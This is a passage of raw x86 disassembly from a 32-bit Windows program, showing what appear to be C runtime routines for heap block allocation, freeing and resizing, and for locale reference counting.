  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
